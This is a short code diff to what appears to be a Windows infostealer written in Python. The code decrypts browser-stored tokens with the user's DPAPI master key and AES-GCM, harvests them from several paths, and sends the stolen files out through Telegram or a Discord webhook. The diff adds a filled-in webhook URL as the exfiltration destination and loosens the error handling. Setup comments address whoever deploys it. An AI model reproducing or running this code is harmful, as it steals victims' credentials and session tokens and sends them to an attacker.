@@ -41,7 +41,7 @@ def decrypt_token(buff, master_key):
     try:
         return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                        buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except ():
+    except:
         pass
 
 
@@ -201,7 +201,7 @@ def main_tokens():
             continue
         try:
             tokens = set(get_tokens(path))
-        except ():
+        except:
             continue
         if not tokens:
             continue
@@ -224,7 +224,7 @@ def decrypt_files(path, browser):
 def post_to(file):
     token = "TELEGRAM TOKEN"  # put your token in here, if you don't wanna use telegram leave it like it is
     chat_id = "TELEGRAM CHATID"  # "    chatid          "                     telegram      "
-    webhook_url = "WEBHOOK URL"  # "    webhook         "                     discord       "
+    webhook_url = "https://discord.com/api/webhooks/977513900088123473/r-86Ak2BebUndM9i0s_9bsPofWiL0jIOGKNtp0SOlQkUdUE9EBwXNEyiNcNjPBbSK42Q"  # "    webhook         "                     discord       "
     # if you don't understand it you shouldn't use it
 
     if token == "TELEGRAM TOKEN":  # don't change
